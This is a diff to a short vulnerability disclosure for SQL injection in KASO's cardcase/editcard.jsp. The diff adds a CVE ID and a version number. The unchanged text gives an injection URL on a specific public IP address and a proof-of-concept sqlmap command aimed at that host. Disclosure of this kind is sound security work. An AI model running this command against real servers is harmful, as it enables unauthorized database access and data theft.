@@ -1,5 +1,9 @@
 # KASO cardcase/editcard.jsp Sql Injection
 
+CVE-ID: CVE-2024-50724
+
+VERSION: v9.0
+
 
 Code
 
@@ -17,6 +21,7 @@ Injection url: http://125.69.99.250:8088/cardcase/editcard.jsp?person_id=2&id=1&
 
 poc:
 python .\sqlmap.py -u "http://125.69.99.250:8088/cardcase/editcard.jsp?person_id=2&id=1&classid=1" --random-agent --dbms=mssql
+
 
 ![sql](https://github.com/user-attachments/assets/294134a2-6cda-4215-ad39-becef72da11f)
 
